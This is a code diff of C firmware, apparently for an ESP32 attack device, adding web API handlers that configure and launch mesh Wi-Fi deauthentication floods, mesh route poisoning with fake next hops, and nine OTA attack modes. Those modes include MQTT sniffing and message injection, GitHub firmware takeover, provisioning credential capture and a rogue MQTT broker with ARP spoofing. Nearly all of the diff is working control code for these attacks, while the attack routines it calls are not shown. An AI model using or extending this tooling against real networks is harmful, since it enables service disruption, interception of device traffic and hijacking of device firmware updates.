+        : MESH_L2_DEAUTH_MODE_TARGETED;
+    cfg.interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint : 50;
+    cfg.burst_size  = cJSON_IsNumber(jburst) ? (uint16_t)jburst->valueint : 5;
+    cfg.reason_code = cJSON_IsNumber(jreason) ? (uint16_t)jreason->valueint : 7;
+
+    if (cJSON_IsString(jssid)) {
+        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
+    }
+
+    if (cJSON_IsArray(jextra)) {
+        int n = cJSON_GetArraySize(jextra);
+        for (int i = 0; i < n && cfg.extra_target_count < MESH_L2_DEAUTH_MAX_TARGETS; i++) {
+            cJSON *item = cJSON_GetArrayItem(jextra, i);
+            if (cJSON_IsString(item) &&
+                parse_mac_arg(item->valuestring, cfg.extra_targets[cfg.extra_target_count])) {
+                cfg.extra_target_count++;
+            }
+        }
+    }
+
+    if (cfg.mode <= MESH_L2_DEAUTH_MODE_NONE || cfg.mode >= MESH_L2_DEAUTH_MODE_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
+        return ESP_FAIL;
+    }
+
+    ESP_LOGW(TAG, "MESH L2 Deauth: bssid=%s mode=%d burst=%u interval=%u",
+             jbssid->valuestring, (int)cfg.mode, cfg.burst_size, cfg.interval_ms);
+
+    esp_err_t ret = mesh_l2_deauth_start(&cfg);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_l2_deauth_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = mesh_l2_deauth_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "active", false);
+        cJSON_AddStringToObject(fallback, "status", "Idle");
+        cJSON_AddNumberToObject(fallback, "packets_sent", 0);
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t mesh_l2_deauth_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_l2_deauth_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
+/* ================================================================== */
+/*  MESH ROUTE POISON HANDLERS                                         */
+/* ================================================================== */
+
+static esp_err_t mesh_route_poison_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[768] = {0};
+    size_t total = 0;
+    int remaining = req->content_len;
+    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
+        return ESP_FAIL;
+    }
+    while (remaining > 0) {
+        int len = httpd_req_recv(req, buf + total, remaining);
+        if (len <= 0) {
+            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+            return ESP_FAIL;
+        }
+        total += (size_t)len;
+        remaining -= len;
+    }
+    buf[total] = '\0';
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
+    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
+    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
+    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
+    cJSON *jhopmac = cJSON_GetObjectItem(root, "fake_next_hop");
+    if (!jhopmac) jhopmac = cJSON_GetObjectItem(root, "next_hop");
+    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
+    cJSON *jmode   = cJSON_GetObjectItem(root, "mode");
+    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
+    cJSON *jintv   = cJSON_GetObjectItem(root, "interval_ms");
+    cJSON *jburst  = cJSON_GetObjectItem(root, "burst_size");
+    cJSON *jhop    = cJSON_GetObjectItem(root, "hop_count");
+    cJSON *jcost   = cJSON_GetObjectItem(root, "path_cost");
+
+    mesh_route_poison_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+
+    if (!cJSON_IsString(jbssid) || !parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid parent_bssid");
+        return ESP_FAIL;
+    }
+
+    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
+        cfg.target_mac_set = true;
+    } else {
+        memset(cfg.target_mac, 0xFF, 6);
+    }
+
+    if (cJSON_IsString(jhopmac) && parse_mac_arg(jhopmac->valuestring, cfg.fake_next_hop)) {
+        cfg.fake_next_hop_set = true;
+    }
+
+    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
+    cfg.mode = cJSON_IsNumber(jmode)
+        ? (mesh_route_poison_mode_t)jmode->valueint
+        : MESH_ROUTE_POISON_MODE_ROUTE_ADV;
+    cfg.interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint : 50;
+    cfg.burst_size  = cJSON_IsNumber(jburst) ? (uint16_t)jburst->valueint : 5;
+    cfg.hop_count   = cJSON_IsNumber(jhop) ? (uint8_t)jhop->valueint : 1;
+    cfg.path_cost   = cJSON_IsNumber(jcost) ? (uint16_t)jcost->valueint : 0;
+
+    if (cJSON_IsString(jssid)) {
+        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
+    }
+
+    if (cfg.mode <= MESH_ROUTE_POISON_MODE_NONE || cfg.mode >= MESH_ROUTE_POISON_MODE_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
+        return ESP_FAIL;
+    }
+
+    ESP_LOGW(TAG, "MESH Route Poison: bssid=%s mode=%d hop=%u cost=%u burst=%u",
+             jbssid->valuestring, (int)cfg.mode, cfg.hop_count, cfg.path_cost, cfg.burst_size);
+
+    esp_err_t ret = mesh_route_poison_start(&cfg);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_route_poison_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = mesh_route_poison_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "active", false);
+        cJSON_AddStringToObject(fallback, "status", "Idle");
+        cJSON_AddNumberToObject(fallback, "packets_sent", 0);
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t mesh_route_poison_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_route_poison_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
 
 /* ================================================================== */
 /*  WiFi ATTACK HANDLERS                                               */
@@ -1569,6 +3211,26 @@ static esp_err_t ble_takeover_notifs_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+
+static bool ota_any_active(void)
+{
+    return ota_mqtt_sniff_is_active() || ota_inject_is_active() || ota_fetch_is_active() ||
+           ota_poll_sniff_is_active() || ota_provision_is_active() || ota_github_is_active() ||
+           ota_rogue_broker_is_active() || ota_fw_analyze_is_active();
+}
+
+static void ota_stop_all(void)
+{
+    ota_mqtt_sniff_stop();
+    ota_inject_stop();
+    ota_fetch_stop();
+    ota_poll_sniff_stop();
+    ota_provision_stop();
+    ota_github_stop();
+    ota_rogue_broker_stop();
+    ota_fw_analyze_stop();
+}
+
 /* ================================================================== */
 /*  OTA ATTACK HANDLERS                                                */
 /* ================================================================== */
@@ -1590,133 +3252,169 @@ static esp_err_t ota_start_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    ota_attack_config_t cfg = {0};
-
     cJSON *mode_json = cJSON_GetObjectItem(root, "mode");
     if (!cJSON_IsNumber(mode_json) || mode_json->valueint < 0 || mode_json->valueint > 8) {
         cJSON_Delete(root);
         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid or missing mode (0-8)");
         return ESP_FAIL;
     }
-    cfg.mode = (ota_attack_mode_t)mode_json->valueint;
+    int mode = mode_json->valueint;
 
-    /* WiFi credentials */
+    char wifi_ssid[33] = "";
+    char wifi_password[64] = "";
     cJSON *ssid_json = cJSON_GetObjectItem(root, "wifi_ssid");
     cJSON *pass_json = cJSON_GetObjectItem(root, "wifi_password");
-    if (cJSON_IsString(ssid_json)) {
-        strncpy(cfg.wifi_ssid, ssid_json->valuestring, sizeof(cfg.wifi_ssid) - 1);
-    }
-    if (cJSON_IsString(pass_json)) {
-        strncpy(cfg.wifi_password, pass_json->valuestring, sizeof(cfg.wifi_password) - 1);
-    }
+    if (cJSON_IsString(ssid_json)) strncpy(wifi_ssid, ssid_json->valuestring, sizeof(wifi_ssid) - 1);
+    if (cJSON_IsString(pass_json)) strncpy(wifi_password, pass_json->valuestring, sizeof(wifi_password) - 1);
 
-    /* MQTT broker */
-    cJSON *broker_json = cJSON_GetObjectItem(root, "mqtt_broker");
-    cJSON *port_json   = cJSON_GetObjectItem(root, "mqtt_port");
-    cJSON *muser_json  = cJSON_GetObjectItem(root, "mqtt_username");
-    cJSON *mpass_json  = cJSON_GetObjectItem(root, "mqtt_password");
-    cJSON *cid_json    = cJSON_GetObjectItem(root, "mqtt_client_id");
-    cJSON *sub_json    = cJSON_GetObjectItem(root, "subscribe_topic");
-    if (cJSON_IsString(broker_json)) strncpy(cfg.mqtt_broker, broker_json->valuestring, sizeof(cfg.mqtt_broker) - 1);
-    cfg.mqtt_port = cJSON_IsNumber(port_json) ? (uint16_t)port_json->valueint : 1883;
-    if (cJSON_IsString(muser_json)) strncpy(cfg.mqtt_username, muser_json->valuestring, sizeof(cfg.mqtt_username) - 1);
-    if (cJSON_IsString(mpass_json)) strncpy(cfg.mqtt_password, mpass_json->valuestring, sizeof(cfg.mqtt_password) - 1);
-    if (cJSON_IsString(cid_json)) strncpy(cfg.mqtt_client_id, cid_json->valuestring, sizeof(cfg.mqtt_client_id) - 1);
-    if (cJSON_IsString(sub_json)) strncpy(cfg.subscribe_topic, sub_json->valuestring, sizeof(cfg.subscribe_topic) - 1);
-
-    /* Injection */
-    cJSON *itopic_json   = cJSON_GetObjectItem(root, "inject_topic");
-    cJSON *ipayload_json = cJSON_GetObjectItem(root, "inject_payload");
-    cJSON *icount_json   = cJSON_GetObjectItem(root, "inject_count");
-    cJSON *iinterval_json = cJSON_GetObjectItem(root, "inject_interval_ms");
-    if (cJSON_IsString(itopic_json)) strncpy(cfg.inject_topic, itopic_json->valuestring, sizeof(cfg.inject_topic) - 1);
-    if (cJSON_IsString(ipayload_json)) strncpy(cfg.inject_payload, ipayload_json->valuestring, sizeof(cfg.inject_payload) - 1);
-    cfg.inject_count = cJSON_IsNumber(icount_json) ? (uint32_t)icount_json->valueint : 1;
-    cfg.inject_interval_ms = cJSON_IsNumber(iinterval_json) ? (uint32_t)iinterval_json->valueint : 0;
-
-    /* Firmware fetch */
-    cJSON *fw_url_json = cJSON_GetObjectItem(root, "firmware_url");
-    cJSON *ssl_json    = cJSON_GetObjectItem(root, "verify_ssl");
-    if (cJSON_IsString(fw_url_json)) strncpy(cfg.firmware_url, fw_url_json->valuestring, sizeof(cfg.firmware_url) - 1);
-    cfg.verify_ssl = cJSON_IsBool(ssl_json) ? ssl_json->valueint : false;
-
-    /* Poll sniff */
-    cJSON *cap_dns_json  = cJSON_GetObjectItem(root, "capture_dns");
-    cJSON *cap_http_json = cJSON_GetObjectItem(root, "capture_http");
-    cfg.capture_dns  = cJSON_IsBool(cap_dns_json)  ? cap_dns_json->valueint  : true;
-    cfg.capture_http = cJSON_IsBool(cap_http_json) ? cap_http_json->valueint : true;
-
-    /* GitHub takeover */
-    cJSON *gh_path_json = cJSON_GetObjectItem(root, "gh_firmware_path");
-    cJSON *gh_branch_json = cJSON_GetObjectItem(root, "gh_branch");
-    cJSON *gh_msg_json  = cJSON_GetObjectItem(root, "gh_commit_msg");
-    cJSON *gh_idx_json  = cJSON_GetObjectItem(root, "gh_captured_url_index");
-    if (cJSON_IsString(gh_path_json)) strncpy(cfg.gh_firmware_path, gh_path_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
-    if (cJSON_IsString(gh_branch_json)) strncpy(cfg.gh_branch, gh_branch_json->valuestring, sizeof(cfg.gh_branch) - 1);
-    if (cJSON_IsString(gh_msg_json)) strncpy(cfg.gh_commit_msg, gh_msg_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
-    cfg.gh_captured_url_index = cJSON_IsNumber(gh_idx_json) ? gh_idx_json->valueint : -1;
-
-    /* General */
     cJSON *timeout_json = cJSON_GetObjectItem(root, "timeout_sec");
-    cJSON *devip_json      = cJSON_GetObjectItem(root, "target_device_ip");
-    cJSON *capdns_json     = cJSON_GetObjectItem(root, "capture_dns");
-    cJSON *caphttp_json    = cJSON_GetObjectItem(root, "capture_http");
-    cJSON *ghpath_json     = cJSON_GetObjectItem(root, "gh_firmware_path");
-    cJSON *ghbranch_json   = cJSON_GetObjectItem(root, "gh_branch");
-    cJSON *ghcommit_json   = cJSON_GetObjectItem(root, "gh_commit_msg");
-    cJSON *ghidx_json      = cJSON_GetObjectItem(root, "gh_captured_url_index");
-    cfg.timeout_sec = cJSON_IsNumber(timeout_json) ? (uint32_t)timeout_json->valueint : 300;
-    if (cJSON_IsArray(devip_json) && cJSON_GetArraySize(devip_json) == 4) {
-        for (int i = 0; i < 4; i++) {
-            cJSON *byte = cJSON_GetArrayItem(devip_json, i);
-            if (cJSON_IsNumber(byte)) cfg.target_device_ip[i] = (uint8_t)byte->valueint;
+    uint32_t timeout_sec = cJSON_IsNumber(timeout_json) ? (uint32_t)timeout_json->valueint : 300;
+
+    esp_err_t err = ESP_FAIL;
+
+    if (mode == 0 || mode == 1) {
+        /* mode 0 SNIFF: MQTT + promiscuous DNS/HTTP; mode 1 CLIENT: MQTT subscribe only */
+        ota_mqtt_sniff_config_t cfg = {0};
+        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
+        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
+        cJSON *broker = cJSON_GetObjectItem(root, "mqtt_broker");
+        cJSON *port = cJSON_GetObjectItem(root, "mqtt_port");
+        cJSON *user = cJSON_GetObjectItem(root, "mqtt_username");
+        cJSON *mpass = cJSON_GetObjectItem(root, "mqtt_password");
+        cJSON *sub = cJSON_GetObjectItem(root, "subscribe_topic");
+        if (cJSON_IsString(broker)) strncpy(cfg.mqtt_broker, broker->valuestring, sizeof(cfg.mqtt_broker) - 1);
+        cfg.mqtt_port = cJSON_IsNumber(port) ? (uint16_t)port->valueint : 1883;
+        if (cJSON_IsString(user)) strncpy(cfg.mqtt_username, user->valuestring, sizeof(cfg.mqtt_username) - 1);
+        if (cJSON_IsString(mpass)) strncpy(cfg.mqtt_password, mpass->valuestring, sizeof(cfg.mqtt_password) - 1);
+        if (cJSON_IsString(sub)) strncpy(cfg.subscribe_topic, sub->valuestring, sizeof(cfg.subscribe_topic) - 1);
+        else strncpy(cfg.subscribe_topic, "#", sizeof(cfg.subscribe_topic) - 1);
+        cfg.enable_promiscuous = (mode == 0);
+        cfg.capture_dns = (mode == 0);
+        cfg.capture_http = (mode == 0);
+        cfg.timeout_sec = timeout_sec;
+        err = ota_mqtt_sniff_start(&cfg);
+    } else if (mode == 2) {
+        ota_inject_config_t cfg = {0};
+        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
+        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
+        cJSON *broker = cJSON_GetObjectItem(root, "mqtt_broker");
+        cJSON *port = cJSON_GetObjectItem(root, "mqtt_port");
+        cJSON *user = cJSON_GetObjectItem(root, "mqtt_username");
+        cJSON *itopic = cJSON_GetObjectItem(root, "inject_topic");
+        cJSON *ipayload = cJSON_GetObjectItem(root, "inject_payload");
+        cJSON *icount = cJSON_GetObjectItem(root, "inject_count");
+        cJSON *iinterval = cJSON_GetObjectItem(root, "inject_interval_ms");
+        if (cJSON_IsString(broker)) strncpy(cfg.mqtt_broker, broker->valuestring, sizeof(cfg.mqtt_broker) - 1);
+        cfg.mqtt_port = cJSON_IsNumber(port) ? (uint16_t)port->valueint : 1883;
+        if (cJSON_IsString(user)) strncpy(cfg.mqtt_username, user->valuestring, sizeof(cfg.mqtt_username) - 1);
+        if (cJSON_IsString(itopic)) strncpy(cfg.inject_topic, itopic->valuestring, sizeof(cfg.inject_topic) - 1);
+        if (cJSON_IsString(ipayload)) strncpy(cfg.inject_payload, ipayload->valuestring, sizeof(cfg.inject_payload) - 1);
+        cfg.inject_count = cJSON_IsNumber(icount) ? (uint32_t)icount->valueint : 1;
+        cfg.inject_interval_ms = cJSON_IsNumber(iinterval) ? (uint32_t)iinterval->valueint : 0;
+        cfg.timeout_sec = timeout_sec;
+        err = ota_inject_start(&cfg);
+    } else if (mode == 3) {
+        ota_fetch_config_t cfg = {0};
+        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
+        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
+        cJSON *fw = cJSON_GetObjectItem(root, "firmware_url");
+        cJSON *ssl = cJSON_GetObjectItem(root, "verify_ssl");
+        if (cJSON_IsString(fw)) strncpy(cfg.firmware_url, fw->valuestring, sizeof(cfg.firmware_url) - 1);
+        cfg.verify_ssl = cJSON_IsBool(ssl) ? ssl->valueint : false;
+        cfg.url_index = -1;
+        cfg.timeout_sec = timeout_sec;
+        err = ota_fetch_start(&cfg);
+    } else if (mode == 4) {
+        ota_poll_sniff_config_t cfg = {0};
+        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
+        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
+        cJSON *cap_dns = cJSON_GetObjectItem(root, "capture_dns");
+        cJSON *cap_http = cJSON_GetObjectItem(root, "capture_http");
+        cJSON *devip = cJSON_GetObjectItem(root, "target_device_ip");
+        cfg.capture_dns = cJSON_IsBool(cap_dns) ? cap_dns->valueint : true;
+        cfg.capture_http = cJSON_IsBool(cap_http) ? cap_http->valueint : true;
+        if (cJSON_IsArray(devip) && cJSON_GetArraySize(devip) == 4) {
+            for (int i = 0; i < 4; i++) {
+                cJSON *b = cJSON_GetArrayItem(devip, i);
+                if (cJSON_IsNumber(b)) cfg.target_device_ip[i] = (uint8_t)b->valueint;
+            }
         }
+        cfg.timeout_sec = timeout_sec;
+        err = ota_poll_sniff_start(&cfg);
+    } else if (mode == 5) {
+        ota_github_config_t cfg = {0};
+        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
+        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
+        cJSON *broker = cJSON_GetObjectItem(root, "mqtt_broker");
+        cJSON *port = cJSON_GetObjectItem(root, "mqtt_port");
+        cJSON *gh_path = cJSON_GetObjectItem(root, "gh_firmware_path");
+        cJSON *gh_branch = cJSON_GetObjectItem(root, "gh_branch");
+        cJSON *gh_msg = cJSON_GetObjectItem(root, "gh_commit_msg");
+        cJSON *gh_idx = cJSON_GetObjectItem(root, "gh_captured_url_index");
+        if (cJSON_IsString(broker)) strncpy(cfg.mqtt_broker, broker->valuestring, sizeof(cfg.mqtt_broker) - 1);
+        cfg.mqtt_port = cJSON_IsNumber(port) ? (uint16_t)port->valueint : 1883;
+        strncpy(cfg.subscribe_topic, "#", sizeof(cfg.subscribe_topic) - 1);
+        if (cJSON_IsString(gh_path)) strncpy(cfg.gh_firmware_path, gh_path->valuestring, sizeof(cfg.gh_firmware_path) - 1);
+        if (cJSON_IsString(gh_branch)) strncpy(cfg.gh_branch, gh_branch->valuestring, sizeof(cfg.gh_branch) - 1);
+        if (cJSON_IsString(gh_msg)) strncpy(cfg.gh_commit_msg, gh_msg->valuestring, sizeof(cfg.gh_commit_msg) - 1);
+        cfg.gh_captured_url_index = cJSON_IsNumber(gh_idx) ? gh_idx->valueint : -1;
+        cfg.timeout_sec = timeout_sec;
+        err = ota_github_start(&cfg);
+    } else if (mode == 6) {
+        ota_provision_config_t cfg = {0};
+        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
+        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
+        cJSON *pport = cJSON_GetObjectItem(root, "prov_sniff_port");
+        cJSON *ppost = cJSON_GetObjectItem(root, "prov_capture_post_only");
+        cJSON *pauto = cJSON_GetObjectItem(root, "prov_auto_parse_json");
+        cfg.sniff_port = cJSON_IsNumber(pport) ? (uint16_t)pport->valueint : 80;
+        cfg.capture_post_only = cJSON_IsBool(ppost) ? ppost->valueint : true;
+        cfg.auto_parse_json = cJSON_IsBool(pauto) ? pauto->valueint : true;
+        cfg.timeout_sec = timeout_sec;
+        err = ota_provision_start(&cfg);
+    } else if (mode == 7) {
+        ota_rogue_broker_config_t cfg = {0};
+        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
+        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
+        cJSON *broker = cJSON_GetObjectItem(root, "mqtt_broker");
+        cJSON *rb_broker = cJSON_GetObjectItem(root, "rb_real_broker_ip");
+        cJSON *rb_port = cJSON_GetObjectItem(root, "rb_real_broker_port");
+        cJSON *rb_rogue = cJSON_GetObjectItem(root, "rb_rogue_port");
+        cJSON *rb_mod = cJSON_GetObjectItem(root, "rb_modify_payloads");
+        cJSON *rb_topic = cJSON_GetObjectItem(root, "rb_modify_topic");
+        cJSON *rb_payload = cJSON_GetObjectItem(root, "rb_modify_payload");
+        cJSON *rb_arp = cJSON_GetObjectItem(root, "rb_arp_spoof");
+        if (cJSON_IsString(broker)) strncpy(cfg.mqtt_broker, broker->valuestring, sizeof(cfg.mqtt_broker) - 1);
+        if (cJSON_IsString(rb_broker)) strncpy(cfg.real_broker_ip, rb_broker->valuestring, sizeof(cfg.real_broker_ip) - 1);
+        cfg.real_broker_port = cJSON_IsNumber(rb_port) ? (uint16_t)rb_port->valueint : 1883;
+        cfg.rogue_port = cJSON_IsNumber(rb_rogue) ? (uint16_t)rb_rogue->valueint : 1883;
+        cfg.modify_payloads = cJSON_IsBool(rb_mod) ? rb_mod->valueint : false;
+        if (cJSON_IsString(rb_topic)) strncpy(cfg.modify_topic, rb_topic->valuestring, sizeof(cfg.modify_topic) - 1);
+        if (cJSON_IsString(rb_payload)) strncpy(cfg.modify_payload, rb_payload->valuestring, sizeof(cfg.modify_payload) - 1);
+        cfg.arp_spoof = cJSON_IsBool(rb_arp) ? rb_arp->valueint : true;
+        cfg.timeout_sec = timeout_sec;
+        err = ota_rogue_broker_start(&cfg);
+    } else if (mode == 8) {
+        ota_fw_analyze_config_t cfg = {0};
+        strncpy(cfg.wifi_ssid, wifi_ssid, sizeof(cfg.wifi_ssid) - 1);
+        strncpy(cfg.wifi_password, wifi_password, sizeof(cfg.wifi_password) - 1);
+        cJSON *fw = cJSON_GetObjectItem(root, "firmware_url");
+        cJSON *idx = cJSON_GetObjectItem(root, "fw_analyze_url_index");
+        cJSON *deep = cJSON_GetObjectItem(root, "fw_deep_scan");
+        cJSON *strings = cJSON_GetObjectItem(root, "fw_extract_strings");
+        if (cJSON_IsString(fw)) strncpy(cfg.firmware_url, fw->valuestring, sizeof(cfg.firmware_url) - 1);
+        cfg.url_index = cJSON_IsNumber(idx) ? idx->valueint : -1;
+        cfg.deep_scan = cJSON_IsBool(deep) ? deep->valueint : true;
+        cfg.extract_strings = cJSON_IsBool(strings) ? strings->valueint : true;
+        cfg.timeout_sec = timeout_sec;
+        err = ota_fw_analyze_start(&cfg);
     }
-    if (cJSON_IsBool(capdns_json)) cfg.capture_dns = capdns_json->valueint;
-    if (cJSON_IsBool(caphttp_json)) cfg.capture_http = caphttp_json->valueint;
-    if (cJSON_IsString(ghpath_json)) strncpy(cfg.gh_firmware_path, ghpath_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
-    if (cJSON_IsString(ghbranch_json)) strncpy(cfg.gh_branch, ghbranch_json->valuestring, sizeof(cfg.gh_branch) - 1);
-    if (cJSON_IsString(ghcommit_json)) strncpy(cfg.gh_commit_msg, ghcommit_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
-    if (cJSON_IsNumber(ghidx_json)) cfg.gh_captured_url_index = ghidx_json->valueint;
-
-    /* Provision sniff config */
-    cJSON *prov_port_json     = cJSON_GetObjectItem(root, "prov_sniff_port");
-    cJSON *prov_post_only_json = cJSON_GetObjectItem(root, "prov_capture_post_only");
-    cJSON *prov_auto_json     = cJSON_GetObjectItem(root, "prov_auto_parse_json");
-    cfg.prov_sniff_port       = cJSON_IsNumber(prov_port_json) ? (uint16_t)prov_port_json->valueint : 80;
-    cfg.prov_capture_post_only = cJSON_IsBool(prov_post_only_json) ? prov_post_only_json->valueint : true;
-    cfg.prov_auto_parse_json  = cJSON_IsBool(prov_auto_json) ? prov_auto_json->valueint : true;
-
-    /* Rogue broker config */
-    cJSON *rb_port_json       = cJSON_GetObjectItem(root, "rb_rogue_port");
-    cJSON *rb_broker_json     = cJSON_GetObjectItem(root, "rb_real_broker_ip");
-    cJSON *rb_bport_json      = cJSON_GetObjectItem(root, "rb_real_broker_port");
-    cJSON *rb_modify_json     = cJSON_GetObjectItem(root, "rb_modify_payloads");
-    cJSON *rb_mtopic_json     = cJSON_GetObjectItem(root, "rb_modify_topic");
-    cJSON *rb_mpayload_json   = cJSON_GetObjectItem(root, "rb_modify_payload");
-    cJSON *rb_arp_json        = cJSON_GetObjectItem(root, "rb_arp_spoof");
-    cfg.rb_rogue_port         = cJSON_IsNumber(rb_port_json) ? (uint16_t)rb_port_json->valueint : 1883;
-    if (cJSON_IsString(rb_broker_json)) strncpy(cfg.rb_real_broker_ip, rb_broker_json->valuestring, sizeof(cfg.rb_real_broker_ip) - 1);
-    cfg.rb_real_broker_port   = cJSON_IsNumber(rb_bport_json) ? (uint16_t)rb_bport_json->valueint : 1883;
-    cfg.rb_modify_payloads    = cJSON_IsBool(rb_modify_json) ? rb_modify_json->valueint : false;
-    if (cJSON_IsString(rb_mtopic_json)) strncpy(cfg.rb_modify_topic, rb_mtopic_json->valuestring, sizeof(cfg.rb_modify_topic) - 1);
-    if (cJSON_IsString(rb_mpayload_json)) strncpy(cfg.rb_modify_payload, rb_mpayload_json->valuestring, sizeof(cfg.rb_modify_payload) - 1);
-    cfg.rb_arp_spoof          = cJSON_IsBool(rb_arp_json) ? rb_arp_json->valueint : true;
-
-    /* Firmware analysis config */
-    cJSON *fw_idx_json        = cJSON_GetObjectItem(root, "fw_analyze_url_index");
-    cJSON *fw_deep_json       = cJSON_GetObjectItem(root, "fw_deep_scan");
-    cJSON *fw_strings_json    = cJSON_GetObjectItem(root, "fw_extract_strings");
-    cfg.fw_analyze_url_index  = cJSON_IsNumber(fw_idx_json) ? fw_idx_json->valueint : -1;
-    cfg.fw_deep_scan          = cJSON_IsBool(fw_deep_json) ? fw_deep_json->valueint : true;
-    cfg.fw_extract_strings    = cJSON_IsBool(fw_strings_json) ? fw_strings_json->valueint : true;
-
-    ESP_LOGI(TAG, "Starting OTA attack: mode=%d ssid=%s broker=%s:%u",
-             cfg.mode, cfg.wifi_ssid, cfg.mqtt_broker, cfg.mqtt_port);
-
-    ota_attack_start_config(&cfg);
 
     cJSON_Delete(root);
+    if (err != ESP_OK) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "OTA start failed");
+        return ESP_FAIL;
+    }
     return send_success_response(req);
 }
 
@@ -1727,7 +3425,7 @@ static esp_err_t ota_stop_handler(httpd_req_t *req) {
     }
 
     ESP_LOGI(TAG, "Stopping OTA attack");
-    ota_attack_stop();
+    ota_stop_all();
     return send_success_response(req);
 }
 
@@ -1737,16 +3435,29 @@ static esp_err_t ota_status_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    cJSON *status = ota_attack_get_status_json();
+    cJSON *status = NULL;
+    if (ota_mqtt_sniff_is_active()) status = ota_mqtt_sniff_get_status_json();
+    else if (ota_inject_is_active()) status = ota_inject_get_status_json();
+    else if (ota_fetch_is_active()) status = ota_fetch_get_status_json();
